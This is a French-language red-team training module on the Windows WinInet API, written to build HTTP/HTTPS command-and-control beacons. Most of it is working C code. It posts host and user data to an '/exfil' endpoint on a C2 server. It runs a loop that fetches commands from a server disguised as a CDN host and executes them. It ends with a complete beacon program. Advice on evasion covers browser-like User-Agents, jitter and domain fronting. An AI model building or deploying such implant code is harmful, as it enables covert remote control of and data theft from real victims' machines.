# WinInet Client - API HTTP Alternative

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre l'API WinInet et ses différences avec WinHTTP
- [ ] Implémenter des requêtes HTTP avec InternetOpen/InternetConnect
- [ ] Gérer des sessions HTTP persistantes pour un agent C2
- [ ] Appliquer WinInet dans un contexte Red Team

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C (variables, fonctions, pointeurs)
- Les concepts HTTP (requêtes GET/POST, headers)
- Module W45 (WinHTTP Client) pour comprendre les différences

## Introduction

WinInet est une API Windows de haut niveau pour les communications Internet. Contrairement à WinHTTP qui est orienté serveur/service, WinInet est conçu pour les applications clientes avec gestion automatique du cache, cookies et proxy.

### Pourquoi ce sujet est important ?

Imaginez deux façons de commander une pizza :
- **WinHTTP** : Vous appelez directement la pizzeria, contrôlez chaque détail
- **WinInet** : Vous utilisez une app qui se souvient de vos préférences, adresse, etc.

WinInet est parfait pour un agent C2 car il se comporte comme un navigateur légitime, utilise les paramètres proxy de l'utilisateur et génère moins de suspicion.

## Concepts fondamentaux

### Concept 1 : Architecture WinInet

WinInet utilise une hiérarchie de handles (poignées) :

```
InternetOpen (Handle racine)
    |
    +-- InternetConnect (Connection au serveur)
            |
            +-- HttpOpenRequest (Requête HTTP)
                    |
                    +-- HttpSendRequest/InternetReadFile
```

**Analogie** : C'est comme ouvrir une session (InternetOpen), composer un numéro (InternetConnect), puis parler (HttpOpenRequest/Send).

### Concept 2 : Différences WinInet vs WinHTTP

| Critère | WinInet | WinHTTP |
|---------|---------|---------|
| **Niveau** | Haut niveau | Bas niveau |
| **Cache** | Automatique | Manuel |
| **Proxy** | Paramètres utilisateur | Configuration manuelle |
| **Cookies** | Gérés automatiquement | Gérés manuellement |
| **Usage** | Applications UI | Services/Agents |
| **OPSEC** | Meilleur (se fond dans le trafic) | Moins bon |

### Concept 3 : Fonctions principales

```
[Application C2]
      |
      v
InternetOpen()          -> Initialise WinInet
      |
      v
InternetConnect()       -> Se connecte au serveur C2
      |
      v
HttpOpenRequest()       -> Prépare une requête (GET/POST)
      |
      v
HttpSendRequest()       -> Envoie la requête
      |
      v
InternetReadFile()      -> Lit la réponse
      |
      v
InternetCloseHandle()   -> Ferme les handles
```

## Mise en pratique

### Étape 1 : Initialiser WinInet

```c
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

// 1. Ouvrir une session Internet
HINTERNET hInternet = InternetOpen(
    "MozillaAgent/5.0",          // User-Agent (important pour OPSEC)
    INTERNET_OPEN_TYPE_PRECONFIG, // Utiliser les paramètres proxy système
    NULL, NULL, 0
);

if (!hInternet) {
    printf("InternetOpen failed: %d\n", GetLastError());
    return 1;
}
```

**Explication** :
- `InternetOpen` crée le contexte principal
- `INTERNET_OPEN_TYPE_PRECONFIG` utilise les paramètres Internet du système (crucial pour OPSEC)
- Le User-Agent détermine comment votre trafic apparaît (utilisez un UA légitime)

### Étape 2 : Se connecter au serveur

```c
// 2. Se connecter au serveur C2
HINTERNET hConnect = InternetConnect(
    hInternet,
    "c2server.com",              // Serveur C2
    INTERNET_DEFAULT_HTTPS_PORT, // Port 443
    NULL, NULL,                  // Pas de credentials
    INTERNET_SERVICE_HTTP,       // Service HTTP
    0, 0
);

if (!hConnect) {
    printf("InternetConnect failed: %d\n", GetLastError());
    InternetCloseHandle(hInternet);
    return 1;
}
```

### Étape 3 : Créer et envoyer une requête

```c
// 3. Ouvrir une requête HTTP
HINTERNET hRequest = HttpOpenRequest(
    hConnect,
    "GET",                       // Méthode HTTP
    "/beacon",                   // URI
    NULL,                        // Version HTTP (défaut)
    NULL,                        // Referrer
    NULL,                        // Accept types
    INTERNET_FLAG_SECURE |       // HTTPS
    INTERNET_FLAG_NO_CACHE_WRITE, // Pas de cache
    0
);

if (!hRequest) {
    printf("HttpOpenRequest failed: %d\n", GetLastError());
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return 1;
}

// 4. Envoyer la requête
if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
    printf("HttpSendRequest failed: %d\n", GetLastError());
}
```

### Étape 4 : Lire la réponse

```c
// 5. Lire la réponse du C2
char buffer[4096];
DWORD bytesRead;

while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
    if (bytesRead == 0) break; // Fin de la réponse

    buffer[bytesRead] = '\0';
    printf("Response: %s\n", buffer);

    // Ici, analyser les commandes C2 reçues
}

// 6. Nettoyer
InternetCloseHandle(hRequest);
InternetCloseHandle(hConnect);
InternetCloseHandle(hInternet);
```

### Étape 5 : Envoyer des données POST

```c
// Envoyer des données exfiltrées au C2
const char* data = "{\"hostname\":\"TARGET01\",\"user\":\"admin\"}";
DWORD dataSize = strlen(data);

HINTERNET hRequest = HttpOpenRequest(
    hConnect, "POST", "/exfil", NULL, NULL, NULL,
    INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0
);

// Ajouter des headers
const char* headers = "Content-Type: application/json\r\n";
HttpAddRequestHeaders(hRequest, headers, -1,
    HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

// Envoyer
if (HttpSendRequest(hRequest, NULL, 0, (LPVOID)data, dataSize)) {
    printf("Data exfiltrated successfully\n");
}
```

## Application offensive

### Contexte Red Team

**Cas d'usage** : Créer un beacon HTTP/HTTPS qui se comporte comme du trafic légitime.

```c
// Agent C2 avec WinInet
void BeaconLoop() {
    HINTERNET hInternet = InternetOpen("Mozilla/5.0",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

    while (1) {
        HINTERNET hConnect = InternetConnect(hInternet,
            "cdn.cloudprovider.com", INTERNET_DEFAULT_HTTPS_PORT,
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

        HINTERNET hRequest = HttpOpenRequest(hConnect, "GET",
            "/api/v1/check", NULL, NULL, NULL,
            INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);

        if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
            char cmd[1024];
            DWORD read;

            if (InternetReadFile(hRequest, cmd, sizeof(cmd), &read)) {
                cmd[read] = '\0';
                ExecuteCommand(cmd); // Exécuter la commande C2
            }
        }

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);

        Sleep(60000); // Beacon toutes les 60 secondes
    }
}
```

### Considérations OPSEC

**Avantages WinInet** :
1. **Proxy automatique** : Utilise les paramètres système (pas de détection proxy bypass)
2. **User-Agent réaliste** : Se fait passer pour un navigateur
3. **Cookies/Cache** : Comportement naturel d'application cliente
4. **Trafic mêlé** : Se fond dans le trafic utilisateur légitime

**Points d'attention** :
```
[Attention !]
- User-Agent cohérent    -> Utiliser un UA courant (Chrome, Firefox)
- Timing des beacons      -> Ajouter jitter (voir module W55)
- Taille des requêtes     -> Varier pour éviter les patterns
- HTTPS obligatoire       -> Éviter HTTP en clair
- Domain fronting         -> Cacher la vraie destination (module W50)
```

### Exemple complet : Beacon WinInet

```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

BOOL SendBeacon(const char* server, const char* uri, const char* data) {
    HINTERNET hInternet = InternetOpen(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
    );
    if (!hInternet) return FALSE;

    HINTERNET hConnect = InternetConnect(
        hInternet, server, INTERNET_DEFAULT_HTTPS_PORT,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    HINTERNET hRequest = HttpOpenRequest(
        hConnect, "POST", uri, NULL, NULL, NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0
    );
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    const char* headers = "Content-Type: application/json\r\n";
    HttpAddRequestHeaders(hRequest, headers, -1,
        HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

    BOOL result = HttpSendRequest(hRequest, NULL, 0,
        (LPVOID)data, strlen(data));

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return result;
}

int main() {
    const char* beaconData = "{\"id\":\"AGENT001\",\"status\":\"active\"}";

    if (SendBeacon("c2.example.com", "/api/beacon", beaconData)) {
        printf("[+] Beacon sent successfully\n");
    } else {
        printf("[-] Beacon failed: %d\n", GetLastError());
    }

    return 0;
}
```

## Résumé

- **WinInet** est une API haut niveau pour HTTP/HTTPS, orientée applications clientes
- **Hiérarchie** : InternetOpen → InternetConnect → HttpOpenRequest → HttpSendRequest
- **OPSEC** : Meilleur que WinHTTP car utilise paramètres système (proxy, cache)
- **Red Team** : Idéal pour beacons HTTP qui imitent du trafic navigateur légitime
- **Proxy** : Gestion automatique via `INTERNET_OPEN_TYPE_PRECONFIG`

## Ressources complémentaires

- [Microsoft Docs - WinInet Functions](https://docs.microsoft.com/en-us/windows/win32/wininet/wininet-functions)
- [WinInet vs WinHTTP Comparison](https://docs.microsoft.com/en-us/windows/win32/wininet/wininet-vs-winhttp)
- [Cobalt Strike HTTP Beacons](https://www.cobaltstrike.com/help-beacon)

---

**Navigation**
- [Module précédent](../W46_https_communication/)
- [Module suivant](../W48_json_parsing/)
